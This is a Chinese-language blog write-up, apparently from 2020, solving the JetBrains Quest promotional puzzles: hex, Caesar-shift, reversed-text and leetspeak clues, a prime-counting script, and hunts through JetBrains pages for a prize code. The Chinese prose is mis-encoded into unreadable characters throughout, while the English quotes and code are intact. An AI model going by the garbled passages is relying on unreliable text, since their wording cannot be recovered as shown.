        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æ˜¨æ™šåœ¨ Telegram é‡Œçœ‹åˆ°æœ‹å‹å‘äº†ä¸€ä¸ª JetBrains Quest çš„ twitter é“¾æ¥ï¼Œæ®è¯´éš¾åº¦ä¸å¤§ï¼Œè¿˜å¯ä»¥ç™½å«–ä»–å®¶çš„äº§å“æˆæƒã€‚</p><p>æ„Ÿå…´è¶£å°±æ¥ä½“éªŒä¸€ä¸‹å§ï¼</p><p>äºæ˜¯ä½“éªŒäº† Quest1 å’Œ 2 ç™½å«–äº† 3+3 ä¸ªæœˆçš„ JB å®¶å…¨äº§å“æˆæƒï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹<strong>é€šå…³è¿‡ç¨‹</strong>ï¼Œä¹Ÿç®—æ˜¯<strong>æ”»ç•¥ / WriteUp</strong> å§ã€‚</p><p>æ„Ÿè§‰ä¹Ÿæ˜¯ CTF, Capture The Flag çš„èŒƒç•´å§ï¼Œæš‚ä¸”å°±å½’ç±»ä¸º CTF å¥½äº†ï¼ˆ</p><p>æ¬¢è¿æ¥å’Œæˆ‘äº¤æµå“ˆã€‚</p><blockquote><p><strong>PAY ATTENTION! æ³¨æ„ï¼</strong></p><p>å¦‚æœæ²¡æœ‰ç©è¿‡çš„è¯</p><p style="color:red">æœ¬æ–‡ä¸‹é¢çš„å†…å®¹ <strong>å…¨ æ˜¯ å‰§ é€</strong>ï¼</p><p><strong>å¦‚æœæƒ³è‡ªå·±åšçš„è¯ï¼Œå°±æš‚æ—¶ä¸è¦å¾€ä¸‹çœ‹äº†ï¼</strong></p></blockquote><p>è¿™ä¸ª Quest <strong>åœ¨ 2020-03-15 12:00 CET ï¼ˆæ¬§æ´²ä¸­éƒ¨æ—¶é—´ï¼‰ä¹‹å‰éƒ½æœ‰æ•ˆ</strong>ã€‚</p><br><h2 id="Quest-1"><a href="#Quest-1" class="headerlink" title="Quest 1"></a>Quest 1</h2><p><a href="https://twitter.com/jetbrains/status/1236986174075482113">https://twitter.com/jetbrains/status/1236986174075482113</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Quest1.png" alt="Quest1"></p><pre class="language-none"><code class="language-none">48 61 76 65 20 79 6f 75 20 73 65 65 6e 20 74 68 65 20 73 6f 75 72 63 65 20 63 6f 64 65 20 6f 66 20 74 68 65 20 4a 65 74 42 72 61 69 6e 73 20 77 65 62 73 69 74 65 3f</code></pre><p>ä¸€çœ‹æ˜¯ hexï¼Œäºæ˜¯è½¬æˆ ASCIIï¼Œå¾—åˆ°ï¼š</p><pre class="language-none"><code class="language-none">Have you seen the source code of the JetBrains website?</code></pre><br><h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>å»å®˜ç½‘ä¸Šæ‰¾å‘—ã€‚ä¼ é€é—¨ï¼š<a href="https://www.jetbrains.com/">https://www.jetbrains.com/</a></p><p>ï¼ˆè¿˜åˆ«è¯´ï¼ŒæŒºä¹…æ²¡ä¸Š JetBrains å®˜ç½‘äº†ï¼Œæ„Ÿè§‰åˆå¤šäº†ä¸å°‘å·¥å…·ï¼Œç•Œé¢ä¹Ÿå˜å¾—æ›´å¥½çœ‹äº†å”‰ã€‚</p><p>æç¤ºäº†çœ‹æºç ï¼Œæ—¢ç„¶æ˜¯ <code>JetBrainsQuest</code> äº†ï¼Œå½“ç„¶å°±**æœä¸€ä¸‹<code>quest</code>**ã€‚</p><p>æœç„¶çœ‹åˆ°äº†æç¤ºã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-1.png" alt="Step1"></p><pre class="language-html" data-language="html"><code class="language-html"><span class="token comment">&lt;!--      O{o)xxx|===============-      OWelcome to the JetBrains Quest.What awaits ahead is a series of challenges. Each one will require a little initiative, a little thinking, and a whole lot of JetBrains to get to the end. Cheating is allowed and in some places encouraged. You have until the 15th of March at 12:00 CET to finish all the quests.Getting to the end of each quest will earn you a reward.Let the quest commence!JetBrains has a lot of products, but there is one that looks like a joke on our Products page, you should start there... (hint: use Chrome Incognito mode)Itâ€™s dangerous to go alone take this key: Good luck! == Jrrg#oxfn$                 O-===============|xxx(o}                 O--&gt;</span></code></pre><p>è¿™é‡Œæç¤ºäº†<code>hint: use Chrome Incognito mode</code>ã€‚</p><p><strong>å»ºè®®ç”¨ Chrome çš„æ— ç—•æ¨¡å¼ã€‚</strong></p><br><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><p>äºæ˜¯å°±<strong>å» products é‡Œæ‰¾</strong>äº†å‘—ã€‚</p><p>ï¼ˆå¯èƒ½æ²¡æ³¨æ„ï¼‰æ²¡æ‰¾åˆ°å…¥å£ï¼Œç›²çŒœå°±åœ¨ <code>/products</code> ç›®å½•äº†ï¼Œè®¿é—®åè·³è½¬åˆ°äº† <a href="https://www.jetbrains.com/products.html">https://www.jetbrains.com/products.html</a> ã€‚</p><blockquote><p>åæ¥å‘ç°ä¸»é¡µä¸Šçš„é“¾æ¥åœ¨ <a href="https://www.jetbrains.com/products.html">See All Tools</a> é‡Œï¼ˆ</p></blockquote><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/products.png" alt="products"></p><p>æ‰¾æ‰¾å“ªä¸ª<code>looks like a joke</code>ï¼Œä¸€çŒœå°±æ˜¯ <strong>JK</strong> äº†ï¼Œè€Œä¸”è¿˜æ˜¯2020.1.1ç‰ˆæœ¬ï¼ˆå˜»å˜» ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-2.png" alt="Step2"></p><blockquote><p>åæ¥å‘ç°ï¼ŒJK è¿™ä¸ªäº§å“å¯èƒ½éœ€è¦åœ¨ <strong>æ— ç—•æ¨¡å¼/éšç§æ¨¡å¼</strong> ä¸‹æ‰å‡ºç°ã€‚ï¼ˆæœ‰å¯èƒ½æœ‰ç¼“å­˜ï¼Ÿ</p><p>åé¢å†æ¥åˆ†æä¸€ä¸‹è¿™ä¸ªæ€ä¹ˆåŠ è½½å‡ºæ¥çš„8.</p></blockquote><br><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><p><strong>æ‰¾ä¸€ä¸‹ 500 åˆ° 5000 ä¹‹å†…æœ‰å¤šå°‘ç´ æ•°</strong>ï¼Œéšæ‰‹å†™ä¸ª py çš„ jio æœ¬ã€‚</p><p>ï¼ˆè¾¹ç•Œå€¼çš„è¯ï¼Œ5000è‚¯å®šä¸æ˜¯ç´ æ•°ï¼Œä¸å½±å“ç»“æœ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> math <span class="token keyword">import</span> sqrtcnt <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sqrt<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> i <span class="token operator">%</span> j <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">break</span>        <span class="token keyword">if</span> j <span class="token operator">==</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sqrt<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            cnt <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'OK!'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span></code></pre><p>è·‘å‡ºæ¥ <code>cnt</code> ä¸º 574.</p><p>äºæ˜¯è®¿é—® <a href="https://jb.gg/574">https://jb.gg/574</a> .<em>ï¼ˆä¸è¾“å…¥çš„è¯æ˜¯è·³è½¬åˆ°å®˜ç½‘çš„</em></p><p><em>ï¼ˆå…¶å®çˆ†ç ´ä¹Ÿè¡Œï¼Œåæ­£å°±ä¸‰ä½æ•°å‘¢</em></p><p>å‘ç° 301 é‡å®šå‘åˆ°äº† <a href="https://www.jetbrains.com/help/pycharm/getting-help.html#quest">https://www.jetbrains.com/help/pycharm/getting-help.html#quest</a> ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-3.png" alt="Step3"></p><br><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><p>Google ä¸Šä¸€æœå°±æ˜¯äº†ã€‚</p><p>ï¼ˆä¸‹é¢è¿˜æœ‰ V2EX ä¸Šåˆ«äººçš„è®¨è®º </p><p><small><em>ï¼ˆï¼ˆä¸çœ‹ä¸çœ‹å…ˆä¸çœ‹ï¼</em></small></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/MPS-31816.png" alt="MPS-31816"></p><p><a href="https://youtrack.jetbrains.com/issue/MPS-31816">https://youtrack.jetbrains.com/issue/MPS-31816</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step1-4.png" alt="Step4"></p><p>è¿™æ˜¯ YouTrack çš„ä¸€ä¸ª issueã€‚<em>ï¼ˆè¿™é‡Œç›´æ¥è°·æ­Œå¯èƒ½æ˜¯éé¢„æœŸè§£äº†</em></p><pre class="language-none"><code class="language-none">JetBrains Questâ€œThe key is to think back to the beginning.â€ â€“ The JetBrains Quest teamQlfh$#Li#|rx#duh#uhdglqj#wklv#|rx#pxvw#kdyh#zrunhg#rxw#krz#wr#ghfu|sw#lw1#Wklv#lv#rxu#lvvxh#wudfnhu#ghvljqhg#iru#djloh#whdpv1#Lw#lv#iuhh#iru#xs#wr#6#xvhuv#lq#Forxg#dqg#iru#43#xvhuv#lq#Vwdqgdorqh/#vr#li#|rx#zdqw#wr#jlyh#lw#d#jr#lq#|rxu#whdp#wkhq#zh#wrwdoo|#uhfrpphqg#lw1#|rx#kdyh#ilqlvkhg#wkh#iluvw#Txhvw/#qrz#lwâ€œv#wlph#wr#uhghhp#|rxu#iluvw#sul}h1#Wkh#frgh#iru#wkh#iluvw#txhvw#lv#â€ŸWkhGulyhWrGhyhorsâ€ 1#Jr#wr#wkh#Txhvw#Sdjh#dqg#xvh#wkh#frgh#wr#fodlp#|rxu#sul}h1#kwwsv=22zzz1mhweudlqv1frp2surpr2txhvw2</code></pre><p>ç»“åˆ Step1 ä¸­çš„ <code>Good luck! == Jrrg#oxfn$</code>ï¼Œåˆ†æå¯çŸ¥æ˜¯<strong>å¾€åç§»äº†3ä¸ªå­—ç¬¦ï¼ˆSHIFT3ï¼‰</strong>ã€‚</p><p>äºæ˜¯å…¨éƒ¨å¾€å‰ç§»3ä¸ªå­—ç¬¦å¾—åˆ°ï¼š</p><pre class="language-none"><code class="language-none">Nice! If you are reading this you must have worked out how to decrypt it. This is our issue tracker designed for agile teams. It is free for up to 3 users in Cloud and for 10 users in Standalone, so if you want to give it a go in your team then we totally recommend it. you have finished the first Quest, now itâ€¦s time to redeem your first prize. The code for the first quest is &lt;TheDriveToDevelop&lt;. Go to the Quest Page and use the code to claim your prize. https://www.jetbrains.com/promo/quest/</code></pre><br><h3 id="Beat-The-Quest"><a href="#Beat-The-Quest" class="headerlink" title="Beat The Quest"></a>Beat The Quest</h3><p>Ruaï¼å“‡å¥½è€¶ï¼</p><p><code>TheDriveToDevelop</code></p><p>ç„¶åå°±å¯ä»¥æ‹¿ç€è¿™ä¸ª code å»ç™½å«–å…è´¹æˆæƒäº†ï¼</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success.png" alt="success"></p><p>è¾“å…¥é‚®ç®±å’Œä¸Šé¢çš„ Codeï¼Œæäº¤å°±å¥½å•¦ã€‚</p><blockquote><p>è¿™é‡Œçœ‹åˆ° Twitter ä¸Šæœ‰äººè¯´ Firefox ä¼šæŠ¥ CORS issueï¼Œè¯·ä½¿ç”¨ Chrome è¯•è¯•ã€‚</p><p><em>(An error occurred while â€¦</em></p></blockquote><p>è¿™é‡Œè¯´äº†ä¼šæŠŠä½ çš„ä¿¡æ¯æä¾›ç»™ä»–ï¼Œä»–ä¼šç»™ä½ çš„é‚®ç®±å‘æ¨èä¿¡æ¯ï¼Œå¯èƒ½è¿™æ˜¯ JetBrains å¸æ”¶æµé‡çš„ä¸€ä¸ªæ‰‹æ®µå§<em>ï¼ˆç›²çŒœçš„</em></p><p>ä¸è¿‡ä»–ä¹Ÿè¯´äº†åœ¨é‚®ä»¶æœ«å°¾å¯ä»¥å–æ¶ˆè®¢é˜…ã€‚</p><blockquote><p>BTWï¼Œå‘ç°è¿™é‡Œçš„ Code å¹¶æ²¡æœ‰ä¸Šä¼ åˆ°åç«¯è¿›è¡Œæ ¡éªŒï¼Œè€Œæ˜¯ç›´æ¥åœ¨å‰ç«¯è¿›è¡Œçš„ã€‚</p><p><em>å¯ä»¥ç»™ Code è¾“å…¥æ¡†çš„ input æ‰“ä¸ªæ–­ç‚¹çœ‹çœ‹ï¼ˆ</em></p><p><em>ï¼ˆæˆ–è€…çœ‹çœ‹æäº¤è¡¨æ ¼çš„ call stack å¥½äº†</em></p></blockquote><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success2.png" alt="success2"></p><p>äºæ˜¯å¾—åˆ°äº†ç™½å«–çš„ <strong>3-months free All Products Pack subscription</strong>ã€‚</p><p>æœ‰ç‚¹æ„æ€å”‰~</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/success3.png" alt="success3"></p><p>ç­‰ç­‰ï¼Ÿ<strong>è¿˜æ²¡å®Œå”‰ï¼</strong></p><p><strong>è¿™æ˜¯ä¸€ç³»åˆ—çš„ Questï¼</strong></p><p>ä¸‹ä¸€ä¸ª quest çš„æ—¶é—´æ˜¯<strong>1583924400</strong>ï¼Œè½¬æ¢æ—¶é—´æˆ³å‘ç°æ˜¯ <strong>2020-03-11 19:00:00</strong>.</p><p><br><br></p><h3 id="Step2-ä¸­-JK-çš„åŠ è½½åˆ†æ"><a href="#Step2-ä¸­-JK-çš„åŠ è½½åˆ†æ" class="headerlink" title="Step2 ä¸­ JK çš„åŠ è½½åˆ†æ"></a>Step2 ä¸­ JK çš„åŠ è½½åˆ†æ</h3><p>çªç„¶æœ‰ç‚¹å¥½å¥‡è¿™ä¸ª JK æ˜¯æ€ä¹ˆè¢«åŠ è½½å‡ºæ¥çš„ï¼Œäºæ˜¯ç®€å•åˆ†æä¸€ä¸‹å§ã€‚</p><p>è¿™é‡Œæœç´¢<code>quest</code>ï¼Œåœ¨ç½‘é¡µæœ«å°¾å¤„çœ‹åˆ°äº†ä¸€ä¸ªåŠ è½½çš„<code>dialog-polyfill.js</code>ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis.png" alt="Elements"></p><p>åœ¨ Sources é‡Œè¿™ä¸ªæ–‡ä»¶é‡Œæœç´¢ <code>JK</code>æˆ–è€…<code>quest</code>ï¼Œéƒ½æ‰¾ä¸åˆ°ç½‘é¡µä¸Šä¸ JK æœ‰å…³ä¿¡æ¯ï¼Œå€’æ˜¯å®šä¹‰äº†ä¸€å †ç›¸å…³çš„å±æ€§æ–¹æ³•ä¹‹ç±»çš„ï¼Œcss æ–‡ä»¶ä¸­æ˜¯<code>dialog</code>æ¡†çš„ç›¸å…³æ ·å¼ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis2.png" alt="dialogJS"></p><p>åœ¨ Network é‡Œçœ‹ <code>products.html</code> çš„ responseï¼Œé‡Œé¢å¹¶æ²¡æœ‰ <code>JK</code>ï¼Œä¹Ÿæ²¡æœ‰<code>quest</code>ã€‚å°±è¿ä¸Šé¢è¿™ä¸ªè„šæœ¬æ–‡ä»¶ä¹Ÿæ²¡æœ‰ã€‚</p><p><strong>é‚£è¿™ä¸ª JK åˆ°åº•æ˜¯æ€ä¹ˆåŠ è½½å‡ºæ¥çš„å‘¢ï¼Ÿ</strong></p><p>äºæ˜¯**åœ¨ Network é‡Œå…¨å±€æœç´¢äº†ä¸€ä¸‹ <code>quest</code>**ï¼Œæœ‰äº†æ–°çš„æ”¶è·ã€‚</p><p>åŸæ¥è¿™äº›ä¿¡æ¯éƒ½æ˜¯<strong>é€šè¿‡ä¸€ä¸ªJSè„šæœ¬æ¥åŠ è½½</strong>çš„ã€‚</p><p>è¿™ä¸ª js çš„ response åŒ…å«äº†é¡µé¢ä¸Šçš„æ‰€æœ‰äº§å“ä¿¡æ¯ï¼Œæ˜¯æŠŠç½‘é¡µå†…å®¹åµŒå…¥åˆ° json é‡Œè¿›è¡Œæ•°æ®äº¤äº’çš„ã€‚</p><p>å“‡ï¼Œç¬¬ä¸€æ¬¡è§å”‰ï¼ğŸ˜‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis3.png" alt="Network"></p><p>å†çœ‹ä¸€ä¸‹ Initiatorï¼Œå‘ç°è°ƒç”¨äº† Googletagmanagerï¼Œè¿™æ˜¯ä»€ä¹ˆä¸œè¥¿å”‰ï¼Œä¹‹å‰çˆ¬è™«è™«ä¹Ÿæ²¡é‡åˆ°è¿‡ï¼ˆåˆæ˜¯æˆ‘çŸ¥è¯†ç›²åŒºäº†</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/JK_Analysis4.png" alt="call stack"></p><p>æŸ¥äº†ä¸€ä¸‹ï¼Œæ˜¯è°·æ­Œçš„æ ‡ç­¾ç®¡ç†å™¨ï¼Œéƒ½è¯ç”ŸæŒºä¹…äº†ç„¶è€Œå¹¶ä¸çŸ¥é“ã€‚</p><blockquote><p><em>Google Tag Manager</em> helps make website tag management simple with tools &amp; solutions that allow small businesses to deploy and edit tags all in one place.</p><p>è¿™é‡Œæ˜¯<a href="https://tagmanager.google.com/">ä»–çš„å®˜ç½‘</a>ã€‚</p></blockquote><p>ä¸Šå»çœ‹äº†ä¸€ä¸‹ï¼Œæ„Ÿè§‰å°±æ˜¯å¯ä»¥åŠ¨æ€ä¿®æ”¹å‰ç«¯çš„ä»£ç ï¼Œä¸ç”¨ç›´æ¥ä¿®æ”¹åŸæœ¬çš„ç½‘ç«™æ–‡ä»¶ï¼Œä¸éœ€è¦é‡æ–°éƒ¨ç½²ã€‚è€Œä¸”è¿˜è‡ªå¸¦ç‰ˆæœ¬ç®¡ç†ï¼Œå¯ä»¥å¤šäººåˆä½œä¹‹ç±»çš„å§ã€‚</p><p>è°·æ­Œçš„ç»Ÿè®¡ä¹Ÿæ˜¯ç”¨è¿™ä¸ªæ¥å®ç°çš„ã€‚</p><p>ä¸è¿‡æœ‰ä¸ªç¼ºç‚¹æ˜¯ï¼Œå›½å†…è®¿é—®æ¯”è¾ƒæ…¢è€Œä¸”è¯´ä¸å®šå“ªå¤©å°±è¿æ¥ä¸ä¸Šäº†ã€‚</p><p>emmm åé¢æœ‰ç©ºæ„Ÿå…´è¶£å†æŠ˜è…¾å§ï¼ˆ</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/googletagmanager.png" alt="googletagmanager"></p><br><hr><br><h2 id="Quest-2"><a href="#Quest-2" class="headerlink" title="Quest 2"></a>Quest 2</h2><p>æ¥äº†æ¥äº†ï¼ç¬¬äºŒä¸ª Quest æ¥äº†ï¼</p><p><a href="https://twitter.com/jetbrains/status/1237694815283879943">https://twitter.com/jetbrains/status/1237694815283879943</a></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Quest2.png" alt="Quest2"></p><pre class="language-none"><code class="language-none">.spleh A+lrtC/dmC .thgis fo tuo si ti semitemos ,etihw si txet nehw sa drah kooL .tseretni wohs dluohs uoy ecalp a si ,dessecorp si xat hctuD erehw esac ehT .sedih tseuq fo txen eht erehw si ,deificeps era segaugnal cificeps-niamod tcudorp ehT</code></pre><p>å¾ˆæ˜æ˜¾å€’å™äº†ï¼Œè¿™é‡Œåè¿‡æ¥å¾—åˆ°ï¼š</p><pre class="language-none"><code class="language-none">The product domain-specific languages are specified, is where the next of quest hides. The case where Dutch tax is processed, is a place you should show interest. Look hard as when text is white, sometimes it is out of sight. Cmd/Ctrl+A helps.</code></pre><p>æç¤ºäº†æ˜¯ä¸ªä¸ <code>domain-specific languages</code>æœ‰å…³çš„äº§å“ï¼Œquestç›¸å…³çš„æ–‡å­—è®¾ç½®ä¸ºç™½è‰²çš„äº†ã€‚</p><br><h3 id="Step-1-1"><a href="#Step-1-1" class="headerlink" title="Step 1"></a>Step 1</h3><p>è°·æ­Œæœä¸€ä¸‹ï¼Œç›´æ¥å°±å¾—åˆ°äº† JetBrains å®¶çš„ <strong>MPS</strong> (MetaProgrammingSystem)   <em>ï¼ˆä¹‹å‰ä¹Ÿæ²¡äº†è§£è¿‡</em></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-1.png" alt="è°·æ­Œæœç´¢ç»“æœ"></p><p>è®¿é—®å®ƒçš„å®˜ç½‘å§ï¼Œä¼ é€å–µï¼š<a href="https://www.jetbrains.com/mps/">https://www.jetbrains.com/mps/</a></p><br><h3 id="Step-2-1"><a href="#Step-2-1" class="headerlink" title="Step 2"></a>Step 2</h3><p>åœ¨ç½‘é¡µé‡ŒåŒæ ·æœä¸€ä¸‹ <code>quest</code></p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-2.png" alt="ç½‘é¡µé‡Œæ‰¾åˆ°pdf"></p><p>å‘ç°æœ‰ä¸ª PDF æ–‡ä»¶å”‰~</p><p>æ‰“å¼€æ¥çœ‹çœ‹å§ï¼</p><br><h3 id="Step-3-1"><a href="#Step-3-1" class="headerlink" title="Step 3"></a>Step 3</h3><p>äºæ˜¯ç»§ç»­åœ¨ PDF é‡Œæœç´¢<code>quest</code>ã€‚</p><p>å‘ç°æœç„¶æ˜¯ç™½è‰²çš„æ–‡å­—23333.</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-3.png" alt="Step3"></p><p>Ctrl + A ï¼ŒCtrl + C / Vï¼Œçœ‹ä¸€ä¸‹é‚£ä¸€å—çš„æ–‡å­—</p><pre class="language-none"><code class="language-none">This is our 20th year as a company,we have shared numbers in our JetBrainsAnnual report, sharing the section with18,650 numbers will progress your quest</code></pre><br><h3 id="Step-4-1"><a href="#Step-4-1" class="headerlink" title="Step 4"></a>Step 4</h3><p>ä¸Šé¢æç¤ºäº†JB 20å‘¨å¹´å¹´åº¦æŠ¥å‘Šï¼Œæƒ³èµ·æ¥å®˜ç½‘é¦–é¡µä¸Šæœ‰ä¸ªé“¾æ¥æ¥ç€ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/20Years.png" alt="20å‘¨å¹´"></p><p><a href="https://www.jetbrains.com/company/annualreport/2019/">https://www.jetbrains.com/company/annualreport/2019/</a></p><p>æ’å‡ å¥é¢˜å¤–è¯ã€‚</p><p>å°±æ˜¯ä¸ªå¹´æŠ¥å§ï¼Œçœ‹ä¸Šå» JB çš„ç¡®æŒºå—æ¬¢è¿å“’ï¼ï¼ˆPyCharm çœŸæŒºå¥½ç”¨çš„</p><p>ä¸‹é¢è¿™ä¸ªè§†é¢‘å°é¢çš„å°é»„é¸­è®©æˆ‘æƒ³åˆ°äº† <strong>å°é»„é¸­è°ƒè¯•æ³•</strong> 23333</p><p>ï¼ˆè¿™ä¸ª <code>Dogfooding</code> ç”¨çš„æœ‰ç‚¹æ„æ€</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/20Years2.png"></p><p>è¿™å›å†æ¥æœç´¢ <code>quest</code>ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-4.png" alt="Step4"></p><p>ç¬¬ä¸ƒå±Š Hackathonã€‚ï¼ˆemmm</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>span</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>react-js-quick-share<span class="token punctuation">"</span></span> <span class="token attr-name">data-hashtag</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JetBrainsQuest<span class="token punctuation">"</span></span> <span class="token attr-name">data-text</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>I have found the JetBrains Quest! Sometimes you just need to look closely at the Haskell language, Hello,World! in the hackathon lego brainstorms project https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/<span class="token punctuation">"</span></span> <span class="token attr-name">data-theme</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>dark<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span></code></pre><br><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><p>è®¿é—® <a href="https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/">https://blog.jetbrains.com/blog/2019/11/22/jetbrains-7th-annual-hackathon/</a></p><p>é‡ç‚¹å…³æ³¨ <code>Haskell language</code>ï¼Œ<code>Hello,World!</code>ï¼Œ<code>hackathon lego brainstorms project</code>ã€‚</p><p>çœ‹æ¥å°±ä¸è¿™å¼ å›¾æœ‰å…³äº†å‘¢ï¼</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-5.png" alt="Step5"></p><p>çœ‹æ¥å°±æ˜¯å³è¾¹å›¾ä¸Šè¿™æ®µè¯äº†ã€‚emmm</p><pre class="language-none"><code class="language-none">d1D joo KN0w J378r41n2 12 4lw4y2 H1R1Ng? ch3ck Ou7 t3h K4r33r2 P4g3 4nD 533 1f 7H3r3 12 4 J08 0R 4 KW35T 0 cH4Ll3n93 70 g0 fUr7h3r @ 13457.</code></pre><p>è‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼Œæˆ‘å¤§æ¦‚ç¿»è¯‘å‡ºæ¥äº†ï¼</p><pre class="language-none"><code class="language-none">Did you know jetbrains is always hiring?Check Out the kareersPage and see if here is a job or akwest challenge togo further at least</code></pre><p>å½¢è±¡å¸¦å¸ˆ 233333</p><p>ï¼ˆè®²çœŸï¼Œè§‰å¾— CTF æœ‰è¶£çš„ä¸€ä¸ªåŸå› å¤§æ¦‚å°±æ˜¯ä»å„ç§å¥‡æ€ªçš„æ•°å­—å¤§å°å†™å­—æ¯æ··æ‚çš„å½¢è±¡çš„ flag å¼€å§‹çš„å§</p><p>ï¼ˆè§‰å¾—å‡ºé¢˜äººè„‘æ´å°±å¾ˆå¤§</p><p>æ¯”å¦‚éšæ‰‹æ¥ä¸€ä¸ª â†’ <code>flag{1t_I5_s0_Fun_70_S33_y0u_H3r3}</code>ã€‚ğŸ˜</p><p>ä¸è¿‡è¿™é‡Œç¬¬ä¸€æ¬¡è§æŠŠ<code>2</code>å½“ä½œ<code>s</code>çš„ã€‚</p><p>è¿˜æœ‰<code>kareers</code>åº”è¯¥æ˜¯<code>careers</code>ï¼Œ<code>kwest</code>åº”è¯¥æ˜¯<code>quest</code>å§ 23333.</p><blockquote><p>æŸ¥äº†ä¸€ä¸‹ï¼Œå‘ç°åŸæ¥è¿™ä¸ªå«åš <strong>Leet</strong>ï¼Œåˆå« <strong>é»‘å®¢è¯­</strong>ã€‚</p><p>è¯¦è§ <code>VV 1 |&lt; 1 P 3 [) 1 4</code> ï¼Œ<a href="https://zh.wikipedia.org/zh-cn/Leet">click here</a>.</p></blockquote><p>æ‰€ä»¥ JB é¡ºä¾¿å†æ¥æ‹›ä¸ªè˜ï¼Ÿ</p><p>çœ‹æ¥ä¸‹ä¸€ä¸ª Step æ˜¯ä¸ªä¸ job æœ‰å…³çš„åœ°æ–¹äº†ã€‚</p><br><h3 id="Step-6"><a href="#Step-6" class="headerlink" title="Step 6"></a>Step 6</h3><p>åœ¨å®˜ç½‘ä¸Šæ‰¾åˆ°äº† Company -&gt; Careers -&gt; Jobs.</p><p><a href="https://www.jetbrains.com/careers/jobs/">https://www.jetbrains.com/careers/jobs/</a></p><p>æœç´¢<code>Quest</code>ï¼Œå‘ç°äº†ä¸€ä¸ªå¥‡æ€ªçš„èŒä½ã€‚é‚£å°±æ˜¯å®ƒäº†ï¼</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/Step2-6.png" alt="Step6"></p><p>äºæ˜¯æ¥åˆ°äº†<a href="https://www.jetbrains.com/careers/jobs/fearless-quester-356/">è¿™ä¸ªé¡µé¢</a> â†“ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/fearless_quester.png" alt="fearless_quester"></p><p>233333 è¿™é‡Œå›é¡¾äº†ä¸€ä¸‹è¿™ä¸€è·¯ journey ç»å†è¿‡çš„é‚£äº›æœ‰æ„æ€çš„ä¸œè¥¿ã€‚</p><p><img src="/2020/03/12/CTF_2020JetBrainsQuest/fearless_quester2.png" alt="fearless_quester2"></p><p>åˆ°ä¸‹é¢è¿™é‡Œï¼Œç‚¹å‡»æŒ‰é’®ï¼Œä¼šç»™å®ƒçš„é‚®ç®±å‘ä¸ªé‚®ä»¶ã€‚</p><p>ï¼ˆ<code>mailto:jobs@jetbrains.com?subject=Fearless Quester - Any - any</code></p><p>ç„¶è€Œå‘ç°å¹¶ä¸æ˜¯å•¦ 23333.</p><p>ç„¶åå†çœ‹å› <code>To progress with your quest what youâ€™ll 